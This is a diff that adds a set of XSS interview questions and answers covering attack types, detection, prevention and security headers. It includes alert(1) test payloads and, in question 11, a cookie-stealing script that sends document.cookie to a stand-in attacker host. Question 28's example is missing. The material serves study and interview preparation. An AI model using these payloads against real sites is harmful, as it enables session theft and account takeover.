@@ -1,0 +1,188 @@
+✅ 1. Basics of XSS
+1. What is Cross-Site Scripting (XSS)?
+XSS is a web vulnerability that allows attackers to inject malicious scripts (usually JavaScript) into web pages viewed by other users.
+
+2. Why is XSS dangerous?
+Steals session cookies or tokens
+
+Defaces websites
+
+Performs actions on behalf of users
+
+Redirects users to malicious sites
+
+Keylogging or phishing
+
+3. What languages are commonly used in XSS attacks?
+Primarily JavaScript, but sometimes HTML, CSS, or VBScript in legacy systems.
+
+✅ 2. Types of XSS
+4. What are the types of XSS?
+Stored XSS: Script is saved on the server (e.g., in a comment).
+
+Reflected XSS: Script is part of a request (e.g., URL) and reflected in the response.
+
+DOM-based XSS: Occurs on the client side, using JavaScript that processes malicious input.
+
+5. Difference between Stored and Reflected XSS:
+Stored: Persistent and affects every user who loads the data.
+
+Reflected: One-time and usually needs a crafted URL.
+
+6. What is DOM-based XSS?
+DOM XSS happens when JavaScript on the page modifies the DOM using unsanitized user input. It does not depend on server response but executes in the browser.
+
+Example:
+
+js
+Copy
+Edit
+document.write(location.hash);
+7. What is Blind XSS?
+Blind XSS happens when the payload executes in a different context (e.g., admin panel). You don’t see the output, but the payload gets triggered in someone else's browser.
+
+8. What is Self-XSS?
+A trick where attackers convince users to run malicious scripts in their browser console—technically not a vulnerability in the website but a social engineering attack.
+
+✅ 3. Detection & Exploitation
+9. How do you detect XSS vulnerabilities?
+Manually inject <script>alert(1)</script> or similar payloads.
+
+Use browser dev tools to inspect reflections.
+
+Use automated tools like:
+
+Burp Suite
+
+XSSer
+
+OWASP ZAP
+
+10. Common payloads for XSS testing:
+html
+Copy
+Edit
+<script>alert(1)</script>
+"><script>alert(1)</script>
+<svg onload=alert(1)>
+"><img src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+11. How does a typical XSS attack steal cookies?
+html
+Copy
+Edit
+<script>fetch('https://attacker.com/cookie?c='+document.cookie)</script>
+12. How to find DOM-based XSS manually?
+Look for innerHTML, document.write, eval, location.hash, etc.
+
+Inject payloads in parameters like #, ?, or form fields and watch DOM behavior.
+
+✅ 4. Real-World & Practical Questions
+13. Have you ever found an XSS vulnerability during pentesting?
+(Example Answer):
+Yes, I found a stored XSS in a profile update form. The payload <img src=x onerror=alert(1)> was stored in the database and executed when admins viewed the profile.
+
+14. What tools do you use to test for XSS?
+Burp Suite Pro (Scanner + Repeater)
+
+XSS Hunter or Blind XSS platforms
+
+OWASP ZAP
+
+Manual browser testing
+
+15. Can XSS be used to bypass 2FA or steal tokens?
+Yes. If an attacker can execute JS in a session-bound context, they can:
+
+Steal 2FA tokens (e.g., via DOM)
+
+Hijack JWT/localStorage
+
+Send authenticated requests as the user
+
+16. Can XSS lead to RCE?
+Not directly, but if XSS affects an admin panel and file upload is allowed, attackers can escalate to RCE.
+
+Also possible in Electron apps or browser extensions.
+
+✅ 5. Prevention & Remediation
+17. How to prevent XSS vulnerabilities?
+Use output encoding (e.g., htmlspecialchars() in PHP).
+
+Implement Content Security Policy (CSP).
+
+Sanitize user input (e.g., using DOMPurify).
+
+Use frameworks that auto-sanitize (e.g., React, Angular).
+
+Validate all input (length, type, context).
+
+18. What is output encoding?
+It converts characters like <, >, and " into safe HTML equivalents (&lt;, &gt;, &quot;) to prevent script execution.
+
+19. How does Content Security Policy (CSP) help prevent XSS?
+CSP is a browser feature that restricts what scripts can run. It blocks inline scripts, remote code, and eval() calls if configured properly.
+
+Example:
+
+http
+Copy
+Edit
+Content-Security-Policy: script-src 'self'
+20. What is the difference between input validation and output encoding?
+Input Validation: Checks if user input is expected (e.g., only numbers).
+
+Output Encoding: Makes the input safe for display in HTML context.
+
+21. Can using frameworks like React or Angular prevent XSS?
+Yes. These frameworks auto-escape output by default and make DOM manipulations safer. But improper use (e.g., dangerouslySetInnerHTML in React) can reintroduce risk.
+
+22. What is DOMPurify?
+A JavaScript library that sanitizes HTML and removes potentially malicious code—used to prevent DOM XSS.
+
+23. What is CSP bypass and how can XSS exploit it?
+Attackers may find ways around poorly configured CSP (e.g., allowing 'unsafe-inline' or whitelisted domains hosting malicious JS). This allows XSS payloads to execute.
+
+24. Can HTTPOnly cookie prevent XSS attacks?
+HTTPOnly cookies can’t be accessed via JavaScript, so attackers can’t steal them using XSS. However, they don’t stop XSS from making authenticated requests (CSRF-like behavior).
+
+25. What are security headers that help mitigate XSS?
+Content-Security-Policy
+
+X-XSS-Protection (legacy)
+
+X-Content-Type-Options: nosniff
+
+Referrer-Policy
+
+✅ Bonus / Tricky Questions
+26. What is event-based XSS?
+Exploits event handlers:
+
+html
+Copy
+Edit
+<img src=x onerror=alert(1)>
+<a href="#" onclick="alert(1)">Click me</a>
+27. Why is eval() dangerous in JavaScript?
+It executes any string as code. If user input reaches eval, it becomes a critical DOM XSS vector.
+
+28. Can you get XSS without <script> tag?
+Yes! Payloads like:
+
+html
+Copy
+Edit
+
+29. What’s the role of CSP nonces in XSS protection?
+CSP nonces allow inline scripts only if they have a valid server-generated nonce, making it harder for attackers to inject random JS.
+
+30. What is mutation-based XSS?
+The browser parses and rewrites user input, which can mutate harmless-looking input into executable code.
+
+Example:
+
+html
+Copy
+Edit
+<input value=""><svg><g/onload=alert(1)>
